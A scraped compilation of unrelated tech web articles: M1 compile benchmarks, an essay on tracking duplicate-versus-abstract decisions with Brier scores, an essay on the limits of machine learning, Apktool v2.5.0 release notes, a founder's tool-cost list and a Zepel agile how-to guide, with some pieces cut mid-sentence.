  you are short on RAM (which all current M1 machines are).</p>

  <p>Here is the summary of all the results we've seen so far:</p>

  <pre>CPU   CORES/THREADS  TIME
-------------------------
E-2288G    8/16      131s
M1         4+4       163s
M1         4         207s
M1         1         691s
E-2288G    1         826s</pre>

  <p>Nobody will argue that this compares apples to oranges on multiple
  dimensions (workstation vs mobile, several years old design/process vs the
  bleeding edge, etc). So let's add some interesting results from the Phoronix
  benchmark. The two classes of CPU that seem relevant to compare to are the
  latest workstation and mobile CPUs from Intel and AMD. Here is my pick (you
  can choose your own, just remember to add an extra 10% to the Phoronix
  results; also note that most of them use GCC instead of Clang):</p>

  <pre>CPU                    CORES/THREADS  TIME
------------------------------------------
AMD   Threadripper 3990X    64/128    56s
AMD   Ryzen        5950X    16/32     71s
Intel Xeon       E-2288G    8/16      131s
Apple                 M1    4+4       163s
AMD   Ryzen        4900HS   8/16      176s*
Apple                 M1    4         207s
AMD   Ryzen        4700U    8/8       222s
Intel Core         1185G    4/8       281s*
Intel Core         1165G    4/8       295s

* Extrapolated.</pre>

  <p>Note that the results for the best mobile Intel (1185G) and AMD (4900HS)
  are unfortunately not yet available and the numbers above are extrapolated
  based on frequency and other benchmark results.</p>

  <p>From the above table it's hard not to conclude that Apple M1 is an
  impressive CPU, especially when we also consider its power consumption.
  What's more, this is the first generally-available, desktop-class ARM CPU.
  For comparison, the same build on Raspberry Pi 4B takes 1724s, more than 10
  times longer! While we cannot boot Linux or Windows on M1, there are early
  indications that it should be possible to boot them in virtual machines with
  decent performance. As a result, ARM-based CI could become generally
  available and is something that we are currently looking into.</p>

  <p>After seeing the initial benchmarks of M1 one can't help but wonder how
  Apple pulled this off. While there is lot of speculation with some bordering
  on black magic and sorcery, I found this <a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested">Anandtech
  article on M1</a> and the one linked from it to be a good source of
  technical information. Here are the highlights:</p>

  <dl>
  <dt><b>TSMC 5nm process</b></dt>
  <dd>Compared to Intel's own 10nm (for 11x5G, 14nm for E-2288G) and AMD/TSMC
  7nm.</dd>

  <dt><b>LPDDR4-4266 RAM</b></dt>
  <dd>Only latest mobile CPUs from Intel and AMD can achieve the same
  speed.</dd>

  <dt><b>Large L1 cache</b></dt>
  <dd>M1 has an unusually large L1 instruction and data caches.</dd>

  <dt><b>Large and fast shared L2 cache</b></dt>
  <dd>Unlike Intel and AMD CPUs which use smaller private L2 caches and a
  large but slower shared L3 cache, M1 uses a fast and large shared L2
  cache.</dd>

  <dt><b>Wide core</b></dt>
  <dd>M1 core is unusually "wide" meaning that it can perform multiple
  instructions in parallel and/or out of order. There is speculation that
  because ARM has weak memory ordering and fixed-size instruction encoding,
  Apple was able to make a much wider core than usual before hitting the
  diminishing returns issue.</dd>
  </dl>

  <p>It would also be interesting to see how/if Apple will be able to scale
  this design to more cores.</p>

December 2, 2020 | https://www.philosophicalhacker.com/post/when-to-dry/ | <a href="https://web.archive.org/web/*/https://www.philosophicalhacker.com/post/when-to-dry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Because abstractions aren’t free, sometimes we’re better off duplicating code instead of creating them.</p>
<p>If that claim doesn’t make sense to you, read <a href="https://martinfowler.com/bliki/Yagni.html" target="_blank">Martin Fowler’s “YAGNI”</a> or <a href="https://sandimetz.com/blog/2016/1/20/the-wrong-abstraction" target="_blank">Sandi Metz’s “The Wrong Abstraction”</a> or watch <a href="https://www.deconstructconf.com/2019/dan-abramov-the-wet-codebase" target="_blank">Dan Abramov’s “WET Code” talk</a> or <a href="https://kentcdodds.com/blog/aha-programming" target="_blank">Kent C. Dodd’s “AHA Programming” talk</a>.</p>
<p>Each of these programmers give advice on when to duplicate code vs. create an abstraction, advice that broadly falls into two camps: either we are advised to follow some rule of thumb or we’re told to ignore rules of thumb, trust our feelings and to only introduce abstractions when it “feels right.” Fowler, Metz, and Abramov are in the first camp. Dodd is in the second one.</p>
<p>While all of these prescriptions are an improvement over categorical adherence to <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" target="_blank">DRY</a>, none of them adequately capture the complexity of the trade off between duplication and abstraction. We can do better.</p>
<p>In the first section of this essay, I’ll argue — like Dodd already has — that the aforementioned rules of thumb can lead to bad decisions about when to abstract vs. duplicate. I also argue — contrary to Dodd — that our feelings/intuitions are <em>not</em> up for the task of guiding our decisions about when to abstract vs. when to duplicate code.</p>
<p>Next, I’ll suggest a more systematic approach for thinking about the abstraction-duplication trade-off. The gist of the approach is to recast duplicate vs. abstract decisions as predictions, to use a brier score to track the quality of those predictions, and to actively build a mental model of how to make them for the particular codebase we’re working in.</p>
<h2 id="heuristics-and-intuition-arent-enough">Heuristics and intuition aren’t enough</h2>
<p>Fowler and Abramov advocate for duplicating code twice before creating a common abstraction.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> Metz tells us “if you find yourself passing parameters and adding conditional paths through shared code, the abstraction is incorrect."<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> Dodd eschews these types of heuristics in his recent “AHA Programming” talk.</p>
<p>I won’t rehearse his argument here, but I do want to side with him in the rejection of simple heuristics. Programming is complicated. Codebases and the organizations that support them are diverse. The rules that describe optimal choices for an engineer at Google are not the same rules that apply to someone working at a 40 person startup.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> Given this, why should we think that good advice on when to abstract vs. duplicate will be easily stated as a cute acronym or pithy sentence?</p>
<p>If you’re skeptical partially because you’re just keeping score of well-known programmers who disagree with Dodd, note that he isn’t the first to suggest something like this. In <em>Domain Driven Design</em>, Eric Evans recognizes that rules of thumb for design often don’t work. He says:</p>
<blockquote>
<p>Sometimes people chop functionality fine to allow flexible combination. Sometimes they lump it large to encapsulate complexity. Sometimes they seek consistent granularity, making all classes and operations similar in scale. These are oversimplifications that don’t work well as general rules…Cookbook rules don’t work.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup></p>
</blockquote>
<p>Enough on the shortcomings of heuristic-based advice. Let’s turn to Dodd’s feelings/intuition based advice.</p>
<p>Dodd tells us to “be mindful of the fact that we don’t really know what requirements will be placed on our code in the future” and that we should only create abstractions when it “feels right.”</p>
<p>The problem here is that our feelings can mislead us, which probably partially explains the appeal of heuristics: we want something more as a guide.</p>
<p>Some readers — and presumably Dodd — would reply, “But more experienced programmers have more trust-worthy feelings!”</p>
<p>Maybe. But if we’re to believe the science on expert judgment and intuition, the impact of experience in helpfully shaping our intuitions here is more limited than we think. Psychologist and behavioral economist Daniel Kahneman won a nobel prize partially because he taught us that expert judgement doesn’t form simply because we’ve been doing something for a long time. For that judgment to form, we need specific feedback loops,<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> loops that are often absent for many programmers who have an average job tenure of 18 months or who use tools and languages that change quickly enough to inspire fatigue or who work for companies that undergo radical changes as they grow from tiny startups to large, proper businesses.</p>
<p>So, heuristics are too cookie-cutter and feelings/intuitions are too wishy-washy. Thankfully, there are other ways of guiding our decisions about abstraction vs. duplication.</p>
<h2 id="a-brier-score-based-method">A Brier score based method</h2>
<p>When we make a design decision in our code, we are basing that decision on a prediction about how the code will change in the future. When we duplicate code instead of abstracting it, we’re predicting that the code we could have abstracted will somehow be inadequate for the future. When we abstract code, on the other hand, we’re predicting that the abstraction will earn it’s keep in our codebase by having many clients.</p>
<p>Since design decisions are informed by predictions, we can use the same frameworks we use for assessing predictions to assess architectural decisions, including decisions about when to abstract code and when to duplicate it. I’ve used <a href="https://en.wikipedia.org/wiki/Brier_score" target="_blank">brier scores</a> for this a few times at my job, and consistent use over time will lead me to develop a set of design principles that are both specific to my situation at Heap — which avoids the cookie-cutter problem heuristics have — and not susceptible to the vagaries of my feelings.</p>
<p>Since I’ve already given an overview of how brier scores work <a href="https://www.philosophicalhacker.com/post/improving-forecasting/">elsewhere</a>, I’ll skip the explanation of the simple math behind them
here. Using this method for assessing abstraction vs. duplicate decisions, is as simple as creating something like the following table:</p>
<table>
<thead>
<tr>
<th>Prediction summary</th>
<th>Date</th>
<th>Confidence</th>
<th>Came true?</th>
<th>Prediction Squared Error</th>
<th>Brier Score</th>
</tr>
</thead>
<tbody>
<tr>
<td>Abstracted code for profile detail view will be re-used within 6 months</td>
<td>10/31/20</td>
<td>.85</td>
<td>TRUE</td>
<td>0.0625</td>
<td>0.0625</td>
</tr>
<tr>
<td>Duplicated code in <code>TodoList.jsx</code> and <code>TodoDetail.jsx</code> will diverge within 3 months</td>
<td>1/31/20</td>
<td>.75</td>
<td>FALSE</td>
<td>0.5625</td>
<td>0.3125</td>
</tr>
</tbody>
</table>
<p>Once enough time has passed to evaluate the accuracy of a prediction, I add some notes explaining why the prediction was off. For example, for the first prediction in the table — a prediction that is similar to a real one I made when I first started my new gig — I might write:</p>
<blockquote>
<p>Turns out the profile detail view doesn’t change very often. In fact, I was told after I refactored it that the subsequent changes I made were the most significant ones done in several years. Should have examined git history of the files involved before committing to creating an abstraction.</p>
</blockquote>
<p>Tracking this sort of thing is obviously more work that applying simple rules of thumb or relying on our feelings, but it’s not that bad. We don’t have to track every decision this way, and updating this spreadsheet is something that I spend less than five minutes on each day.</p>
<p>If spending 5 minutes a day<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> gets me a context-specific, data-driven model about where to spend my refactoring time, that’s totally worth the trouble. I’ll take it over simple heuristics or my flawed intuition any day.</p>

          <p>
            We investigate the limitions of statistical methods, a subclass of which is called "machine learning", taking the opportunity to touch on several aspects of the industry, including the future of employment, various industry practices, and privacy. It's written as a wide-audience article, and only assumes a passing familiarity with software and statistics. We start from a seemingly hardline stance, and follow a line of flawed reasoning leading up to the point where humans become near-obselete, an event commonly known as the "singularity". Finally, we step back to see where we stumbled.
          </p>
          <p>
            We use the following starting point: using any combination of statstical methods, of any complexity, it is impossible to develop any sort of "understanding" that resembles human intelligence. Instead of trying to tackle questions about the nature of intelligence, or entering a deep philosophical rabbit-hole about whether "intelligence is computable", we start with the modest goal of understanding what statistical methods are.
          </p>
          <p>
            As a starting point, one might argue that the world is made of up of a collection of "facts" that need to be "memorized" after having seen them stated multiple times correctly. A variation of this is the "monkey brain", in which you train the monkey by asking it to perform a certain task, rewarding it everytime it gets it right, and penalizing it everytime it gets it wrong. This is the basic idea behind "reinforcement learning", the kind used to get machines to play "games". Speed up the task-to-[reward or penalty] cycle exponentially, and you have a "smart monkey". While the "smart monkey" might make silly mistakes on a bad day for irrational reasons, a "bad day" for a statistical model is the event when it is presented with data that it doesn't know how to fit. The monkey's emotional engine can arguably be emulated by weighting the penalty that the machine receives, based on how fundamental the mistake was, and how many hours of training it had received. The procedure we've described of "training" a machine like this falls under the class of "supervised learning", which, as one might argue, is the same way a human learns from an assignment or exam.
          </p>
          <p>
            Let us assume that a machine can successfully memorize trillions of "facts", and look into how these might be represented. In most commonly-used applications today, they are encoded in the form of matrices of floating-point numbers, with some weighted arithmetic operations connecting them, as chosen by the person building the model. The model is fed a matrix of floating-point numbers, and outputs a matrix of floating-point numbers. We might argue that the inability to interpret these individual numbers is akin to not being able to interpret the voltages of the individual neurons in the brain, and this doesn't seem to be a problem in practice. The said "facts", now lost in a soup of numbers, can be generalized into a broader class of "things that can be inferred from data". With every attempt at being able to handle a new situation, the model simply does arithmetic on the soup (a large class of which are just matrix multiplications), and the numbers in the soup adjust themselves with every "feedback" we give it. This is the basic idea behind "neural networks". While it's easy to get lost in the details, note that we're still doing statistical analysis. The additional "frills" haven't changed the essential nature of the method: the machine is "learning by example", and attempting to "generalize" it.
          </p>
          <p>
            Among human beings, learning by example is a very effective way to learn, when starting out. Most programmers would attest to the fact that they started out by copying examples, tweaking them, and checking them with a program (these programs are known as "compilers"). Some would argue that this approach doesn't scale in human beings, because they don't have the computational power to continue learning by example, and "cheat" by reading some kind of specification as they become more experienced. Does it mean that classical programmers (aka. those not engaged in building statistical models) could be replaced by machines in the future?
          </p>
          <p>
            The key to seeing the viability of this argument is to consider two things: (1) the structural complexity of the task, and (2) the number of examples available to concretely reinforce the patterns, and nullify the anti-patterns. It's no secret that there are several good tools for aiding with "simple" programming langauages (otherwise called IDEs), which a reductionist would phrase as "machines are good at dumb tasks". Using simple frequency analysis, the IDE can order its auto-complete suggestions and corrections intelligently. To date, there is no IDE that can assist with the help of the vast repositories of open-souce code, but it doesn't require a big leap in imagination to assume that this will be possible in the future. In fact, we should be open to the possibility that compilers start building repositories of error-messages, and run in the background, suggesting even more intelligent fixes, based on how others who encountered a similar error fixed it. A philophically-minded reader would be interested in whether the "intent" of the programmer can be dissected, and if, by labelling various segments of publicly available code with some kind of abstract "function", the machine can write entire programs with a few prompts. Assuming for a minute that this might be possible, can classical programmers stay relevant by simply moving to newer languages or technologies, on which there are few examples?
          </p>
          <p>
            This poses a quandary: are we playing some kind of primal game, where the prey constantly has to come up with new strategies to outrun the predator? Some would argue that by refining our statistical methods, one can emulate the process of generalization effectively enough to beat the prey's creativity on the "search space" completely. What if this is the nature of every human specialization? An event, commonly referred to as the "singularity", whereby humans become near-obselete, is predicted in 2040. Why is this claim so ludicrous?
          </p>
          <hr>
          <p>
            To better understand where statistical models are succesful, let us enumerate some recent accomplishments in the field.
          </p>
          <p>
            Beating the best human player at Go, a program referred to as AlphaGo. The problem is well-defined, and there are very few starting rules. How does a human become good at Go? Just like in Chess, the rules play an insignificant role in the player's learning, and most of the training is about analyzing previous games. There are huge databases of expertly-played games available, and human players usually try to follow a semi-systematic approach. It could be argued that the machine is inefficient, because it doesn't follow a systematic approach, but the raw computational power makes this handicap look irrelevant. It's a little like arguing that a machine doesn't know the decimal system, or the tables of multiplication, and simply flips 0s and 1s to perform arithmetic. Humans here are the disadvataged class in both cases, and it is completely unsurprising that, despite certain "inefficiencies", AlphaGo essentially does what a human player does to beat them at it: analyzing lots of games.
          </p>
          <p>
            A language engine, referred to as GPT-3. How do humans master a natural language? They do it semi-systematically, starting from the association of simple words to real-world objects, then moving on to phrases describing something, learning some construction rules and absorbing culture along the way; and finally by reading a lot of good literature. Of course, the grammar rules play a very small part of the overall learning, so it is unsurprising that GPT-3 is able to produce grammatically correct responses to human-supplied prompts. However, literature talks about things in the real world, and for it to make sense, sufficient interaction with the real world is a prerequisite. It's not a bounded game, where all the necessary information is contained on a map or a board. It is, therefore, entirely unsurprising that GPT-3 can't "know" whether dropping a metallic plate would cause it to melt. It cannot infer the relationship between real-world objects, nor can it differentiate between factual and fictional human experiences. Producing good literature requires a whole lot more than that. This landmark achievement, despite having access to terabytes of text, and an unimaginable amounts of compute power, has failed to infer much more than grammar, sentence construction, and context.
          </p>
          <p>
            The translation engine behind Google Translate. Someone who has just started using the product with no knowledge of the underlying technology would be puzzled about why this is chalked up as an achievement. Indeed, it's unlikely that we'll even have a half-decent translation engine using purely statistical methods. Translation engines have been around for a long time, and their latest iteration might be a significant improvement over the previous ones, but on an absolute scale, something seems to be off about relying on a pure statistical method to learn natural language.
          </p>
          <p>
            Medical diagnostics. In this field, it is absolutely imperative to organize every little piece of data about every patient in a highly systematic manner: a missing entry is a life-or-death situation. On millions of these remarkably well-organized records, it should come as no surprise that a machine can serve as a valuable aid to a doctor. Statistical models have been a resounding success in this area. The achievement here, perhaps, should be attributed to the subfield of …</p></article></div>

This is a long overdue release that fixes many long-running issues.</p><p>The last release was way back on November 29, 2019 and by the time this version is released - It will have been over 1 year since our last Apktool release. So what happened?</p><p>Honestly a combination of 2020, burnout and life changes. None of which are important to this release post. Though if you are interested - I <a href="https://connortumbleson.com/2017/05/01/the-human-behind-the-keyboard/">blogged</a> about some of the burnout of long-running open source projects.</p><p>Let's talk about maintaining a backlog. Apktool prior to this release had over 250 tickets ranging from 8 years old to 1 day old. It was frankly insane. Some of the topics hadn't even been responded to in years. So I spent <a href="https://twitter.com/iBotPeaches/status/1333065159552757760">roughly 20 hours</a> over Thanksgiving and went <strong>through every single ticket</strong>. The backlog is now 40 tickets, organized and ready to be fixed. Some tough choices were made on a handful of tickets, but I had to be realistic when it came to fixing some of these anti-tamper issues.</p><p>I wouldn't have done this without the help from "peret" who helped build aapt/aapt2 binaries for me on Mac. For some reason (still to this post) a few select repositories cloning from AOSP result in:</p><pre><code>RPC failed: HTTP 499 curl 16 Error in HTTP2 framing layer</code></pre><p>This was blocking me for months from completing the release. However, that is enough meta discussion. Apktool development is active again, a smaller backlog has me hooked and a helpful community of authors will keep the discussions and features going.</p><p>So lets talk about the changes.</p><hr><p>This release packs in Android 11 support, which will require a framework update as well as upgrading to the latest and greatest <a href="https://github.com/JesusFreke/smali">smali</a> project. We embraced GitHub Actions dropping TravisCI and started the deprecation process for 32 bit machines. (Sorry, AOSP is pushing me here)</p><p>Error messages were overhauled to help explain why things aren't working. Test cases were enhanced to prevent regressions and each pull request is automatically tested again all 3 major operating systems and a variety of Java versions.</p><p>The obfuscation war never ends and Apktool v2.5.0 makes leaps of improvements when it comes to parsing files. Apktool will survive when all namespace references have been removed. Apktool will survive with dummy resources if all resource names have been stripped. Apktool will also survive if all resources have been tweaked to the same name. This of course makes compilation very difficult, but at least the application can be disassembled now.</p><p>Binaries for aapt/aapt2 received another great set of patches aiming to lessen the errors that either will encounter during compilation. This led to patching many compression related bugs when it comes to rebuilding applications as well as patching many crashes that result when resources can't be found.</p><p>Features were added for the new <code>compileSdkVersion</code> property as well as a <code>apktool list-frameworks</code> command. Finally, some quality of life enhancements for error codes, helper scripts and copyrights. So with that, the detailed change log and author breakdown.</p><hr><p><strong>This release had 180 commits by 11 people</strong></p><ul><li>Connor Tumbleson (iBotPeaches) - 160 commits</li><li>Giacomo Ferretti (giacomoferretti) - 4 commits</li><li>Frieder Bluemle (friederbluemle) - 3 commits</li><li>Peter Retzlaff - 3 commits</li><li>Ankit Pati (ankitpati) - 2 commits</li><li>Comnir (Nir) - 2 commits</li><li>Leo Wandersleb (Giszmo) - 1 commit</li><li>Patrick Decat - 1 commit</li><li>Steven Arzt (StevenArzt) - 1 commit</li><li>Taras - 1 commit</li><li>chris-sharl - 1 commit</li><li>vladimir (vldmrrr) - 1 commit</li></ul><ul><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2399">#2399</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2397">#2397</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2369">#2369</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2167">#2167</a>] Android 11 Support.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2006">#2006</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/1718">#1718</a>] Upgraded smali/baksmali to v2.4.0.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2210">#2110</a>, <a href="https://github.com/iBotPeaches/Apktool/issues/2053">#2053</a>] Deprecate 32 bit operating systems.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2251">#2251</a>] Fix thread crash with binary name collision.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2323">#2323</a>] Fix compression on <code>resources.arsc</code>.</li><li>[<a href="https://github.com/iBotPeaches/Apktool/issues/2333">#2333</a>] Fix crash with empty files during compression.

            <p>I always enjoy seeing which products founders use so I thought I'd share the ones I use, what I use them for, and how much they cost.</p><h3>Subscriptions</h3><p><a href="https://www.digitalocean.com/" target="_blank"><b>DigitalOcean</b></a></p><p>I use DigitalOcean to host all of my products (which are mostly built with Django). I also use their "volume storage" product. I've hosted with AWS before, but found DigitalOcean way easier to use and manage.</p><p><span>Across my products, this currently costs $295 per month</span>, but that should be decreasing in coming months wind down some more resource intensive products.</p><p><b><a href="https://buffer.com/" target="_blank">Buffer</a></b></p><p>I've been a Buffer customer for many years and mainly use their API to automatically schedule posts for the Screenlane Twitter account. The API doesn't seem to be a priority for them so I'm open to switching, but there doesn't seem to be any solid alternatives for the price and it still works for me.</p><p><span>$10 per month</span></p><p><a href="https://calendly.com/" target="_blank"><b>Calendly</b></a></p><p>I use Calendly to make it easy for people to book meetings with me. I mostly needed this for the "Book a demo" flow for <a href="https://screenjar.com/" target="_blank">Screenjar</a>. I could have probably got away with the free plan, but decided to upgrade at some point.</p><p><span>$8 per month </span>(I got the yearly plan at $96)</p><p><a href="https://postmarkapp.com/" target="_blank"><b>Postmark</b></a></p><p>Transactional emails (password resets emails etc). One of my favourite products - easy to navigate &amp; set up, great company, and super reasonable pricing.</p><p><span>$10 per month</span></p><p><a href="https://sendgrid.com/" target="_blank"><b>Sendgrid</b></a></p><p>Also transactional email. I probably need to cancel this and move a couple projects over to Postmark.</p><p><span>$14.95 per month</span></p><p><a href="http://urlbox.io/" target="_blank"><b>Urlbox.io</b></a></p><p>This is a URL to image API which I use to automatically take screenshots of emails for <a href="https://pageflows.com/" target="_blank">Page Flows</a> (emails sent as part of a user flow are captured. <a href="https://pageflows.com/post/desktop-web/onboarding/basecamp/" target="_blank">You can see an example at the bottom of this page</a>)</p><p><span>$29 per month</span></p><p><a href="https://www.imgix.com/" target="_blank"><b>Imgix</b></a></p><p>This is used to process images, automatically create thumbnails of uploaded images etc. I'll likely stop using this soon as I'm winding down most of the products I used it for.</p><p><span>~$50 per month</span></p><p><a href="https://emailoctopus.com/" target="_blank"><b>Email Octopus</b></a></p><p>I just stated using this to send all of my newsletters.</p><p><span>~$100 per month</span></p><p><a href="https://workspace.google.com/" target="_blank"><b>Google Workspace or G-Suite or whatever it's called these days</b></a></p><p>I use this to create email accounts with custom domains mainly. I hate it.</p><p><span>~$15 per month</span></p><p><a href="https://carrd.co/" target="_blank"><b>Carrd</b></a></p><p>I made the landing page for <a href="https://metapine.com/" target="_blank">Metapine</a> with this. Great tool.</p><p><span>$1.58 per month!!! ($19 per year)</span></p><h3>Others</h3><p>Some other bits and bobs the business has paid for reasonably recently</p><p><a href="https://stripe.com/" target="_blank"><b>Stripe</b></a></p><p>I use Stripe to handle payments and they take a cut of revenue for that.</p><p><a href="https://refactoringui.com/" target="_blank"><b>Refactoring UI</b></a></p><p>A simple, practical book on UI design. This has come in handy a few times and I use some of the icons that came with it on.</p><p><u>$149</u></p><p><a href="https://salesforfounders.com/" target="_blank"><span>Sales for founders</span></a></p><p>Says it in the name. A course and a community for founders who want to learn sales. I still get involved in the community from time to time.</p><p><u>~$200</u></p><p><a href="https://kintu.co/profitable-newsletters/" target="_blank"><b>Profitable newsletters</b></a></p><p>A course about creating profitable newsletters. I'll be honest, I haven't gone through any of this yet.</p><p><u>$99</u></p><p><a href="https://www.softwareideas.io/" target="_blank"><b>Software ideas</b></a></p><p>A newsletter which shares ideas for software businesses (cancelled subscription).</p><p><u>$19 per month</u></p><p><a href="https://nichesaas.substack.com/" target="_blank"><span>Niche SaaS</span></a></p><p>Another newsletter which shares ideas for software businesses (cancelled subscription).</p><p><u>~$6 per month ($70 per year)</u></p><p><b>Accountant</b></p><p>Super happy to pay for this, highly recommended.</p><p><span>~$100 per month</span></p><p><a href="https://www.redditinc.com/advertising" target="_blank"><b>Reddit Ads</b></a></p><p>Experimented with some ads, didn't really get anywhere with it.</p><p><span>~$50</span></p><p><a href="https://gfycat.com/gifbrewery" target="_blank"><b>GIF Brewery</b></a></p><p>For recording gifs (mainly for <a href="https://screenlane.com/" target="_blank">Screenlane</a>)</p><p><span>~$8</span></p><h3>Free products</h3><p>I'd likely pay for these if I had to and there were no free alternatives.</p><p><b><a href="https://cloudflare.com/" target="_blank">Cloudflare</a></b></p><p>CDN, caching, protection from DDOS attacks etc</p><p><b><a href="https://whereby.com/" target="_blank">Whereby</a>&nbsp;&amp; <a href="https://zoom.us/" target="_blank">Zoom</a></b></p><p>I use both of these for video meetings</p><p>I also use <a href="https://www.notion.so/" target="_blank"><b>Notion</b></a> sometimes, but mostly default to using the Apple notes app.</p><hr><p>That's actually more than I expected. If you have any questions about any of these, whether I'd recommend them etc, let me know.</p>

                    <p>If you’re here, my guess is there are some inefficiencies in the way your team is working right now. And you’re likely looking to eliminate them by implementing agile within your team.</p><p>Of course, implementing agile isn’t just about firing up an agile software tool and collaborating with your teammates. </p><p><em>If it were that easy, you wouldn’t be reading this article, would you? </em>😉</p><p>That’s why I’ll walk you through every single step on how you can successfully implement agile within your team in this article.</p><h2 id="quick-context-on-agile-the-what-the-why">Quick Context on Agile: The What &amp; The Why</h2><p><em>Waterfall: You can’t make changes to an ongoing project, certainly not to the business needs and expectations.</em></p><p><em>Agile: Hold my beer </em>😎</p><p>Agile is an extremely practical approach to developing great products. Unlike waterfall, where risks can’t be afforded and failure isn’t an option, agile embraces risks and is prepared to handle failure. </p><p>Agile has the willingness to learn throughout the product development process. And it has the openness to incorporate changes received via early feedback, at any stage. These qualities of agile attribute to its high success rates - <a href="https://vitalitychicago.com/blog/agile-projects-are-more-successful-traditional-projects/">2x that of the waterfall method</a>!</p><p>So, you needn’t worry about a project taking several months only to find out it is nothing like you visualized. No such bummers with agile! </p><p>It serves as the perfect medium for teams to learn and grow while satisfying the customer’s needs. Seriously, who doesn’t want that?</p><p>Now that you know what agile is and why it’s popular, let’s skip to the important part: how to implement the agile method successfully?</p><h2 id="successful-agile-implementation-steps-to-get-it-right">Successful Agile Implementation: Steps to get it right</h2><p>Agile is receiving a lot of backslashes on the Internet of late. But when you take a closer look, you'll find there's only one major reason behind this - poor implementation of agile practices. So, to maximize agile’s potential, it is critical to implement it while following its principles and values as mentioned in the <a href="https://zepel.io/agile/agile-manifesto/?utm_source=agilelibrary&amp;utm_medium=text&amp;utm_campaign=agile-methodology-implementation-steps-guide/">Agile Manifesto</a>.</p><p>Now, let’s look at the key steps involved in the agile software development process and how to implement it.</p><h3 id="step-1-envisioning-the-product">Step 1: Envisioning the Product</h3><p>The first and foremost thing to do before you begin your project is to clearly define what you intend to achieve through it. And then, to visualize it completely from start to end. </p><p>Picture it, draw it if you must, and jot down the important details regarding the project that will form its foundation. The details must cover:</p><ul><li><strong>Addressing the Problem </strong>- problem statement, need for a solution, how the solution will address the problem</li><li><strong>Market Research</strong> - scope, target audience, competitor analysis, positioning</li><li><strong>Product Definition</strong> - name, features, benefits, value proposition</li></ul><p>The purpose of this step is to gain clarity regarding the project’s vision and brainstorm for ideas to implement it. And also to ensure that your entire team is on the same page.</p><p><strong>Example:</strong> Let’s assume that your project is to develop a mobile app for taxi services. </p><p>You do all the groundwork and market study. You identify your target audience, their deepest problems with the current solution, how your app solves it, and who your competitors are. You also visualize how your app will look and operate. </p><p>Once you visualize your app, you create the project by giving it a name, brainstorm and note down the features it will possess, and write user stories for each feature.</p><p>When kick-starting a project, you’ve got to begin with a bang. Because, as the Irish proverb goes, “<em>Making the beginning is one-third of the work</em>.” &nbsp;</p><p>To help you kick-start on the right note and set the pace for the rest of the project, use the right tool that’s perfect for you. </p><p><em>Zepel can be that tool</em>.</p><p>Zepel allows you to create projects or <em>Squads </em>and name them as per your convenience. Once you’ve created your squad, you can create the necessary <em>Features</em>. </p><figure><img src="https://zepel.io/agile/content/images/2020/10/zepel-feature-progress-updates.png" alt="Features and their progress within a squad in Zepel" srcset="https://zepel.io/agile/content/images/size/w600/2020/10/zepel-feature-progress-updates.png 600w, https://zepel.io/agile/content/images/size/w1000/2020/10/zepel-feature-progress-updates.png 1000w, https://zepel.io/agile/content/images/2020/10/zepel-feature-progress-updates.png 1200w" sizes="(min-width: 720px) 720px"><figcaption>Create features within your squad and quickly view their progress</figcaption></figure><p>Under each feature, you can create user stories, and add specific tasks and subtasks. Give your tasks a name, description, due date, and also assign them to your team members.</p><h3 id="step-2-laying-out-a-roadmap-and-organizing-the-releases">Step 2: Laying Out a Roadmap and Organizing the Releases</h3><p>On attaining a clear picture of the project, the next thing to do is laying out the roadmap along with a rough plan of the releases. </p><p>Here, you and your team must discuss and design a plan of action for the product. This plan of action must include an overview of the product development iterations with tentative deadlines for each release. </p><p>Once you’ve designed your roadmap, it is essential to create a timetable with the set milestones i.e timeframes for each release of the product. These timeframes need not be exact dates but it is ideal to set realistic deadlines. </p><p>In doing so, neither will the team become lethargic nor will the product owner lose patience. So go ahead and create that timetable with all the release dates. </p><p><strong>Example:</strong> You create a roadmap for the taxi service app with approximate, realistic timeframes.</p><p>You’ve divided your project into 4 milestones - Core UI design, maps with payment, taxi booking within your city, cab rentals for long-distance rides.</p><p>You now plan the releases for this project with loose timeframes and organize them in a timetable.</p><p>With this roadmap, you have successfully translated your vision into a plan of action for your team to follow.</p><h3 id="step-3-choosing-your-framework-go-scrum-or-go-kanban">Step 3: Choosing your framework - Go Scrum or go Kanban?</h3><p><em>“We are who we choose to be.” – Green Goblin, from Spider-Man</em></p><p>Similarly, your project will be what we want it to be if you choose the right framework. </p><p>But to choose wisely, you would need to know the answers to the following questions:</p><ul><li>What are scrum and kanban?</li><li>Why and when to choose them?</li><li>How to implement them?</li><li>Differences between scrum and kanban</li></ul><p>Let’s dive right in, shall we?</p><h2 id="when-to-choose-scrum">When to choose Scrum?</h2><p>Scrum is a widely used agile framework. In this method, complex problems are broken down into smaller workable solutions and are delivered in sprints. Each sprint is timeboxed to be released in 1 - 4 weeks, most commonly within 2 weeks.</p><p>Most teams pick scrum as their preferred agile methodology because it is the most popular and successful framework. According to <a href="https://www.scrumalliance.org/ScrumRedesignDEVSite/media/scrumalliancemedia/files%20and%20pdfs/state%20of%20scrum/scrum-alliance-state-of-scrum-2015.pdf">Scrum Alliance’s 2015 survey</a>, 62% of scrum projects were a success. I’m sure the numbers have gone up since then.</p><p>But how do you know if scrum is ideal for your project? Scrum is apt when your project calls for:</p><ul><li>Openness to incorporate changes in requirements, priorities, and even solutions after each iteration</li><li>Working in cycles on limited features with guaranteed delivery at the end of each cycle</li><li>Customer-centric testing and feedback is the priority </li></ul><p>Does scrum seem impressive? Or are you thinking like hey it seems all good on paper but how does it fare in the real world? </p><p>To answer that, <a 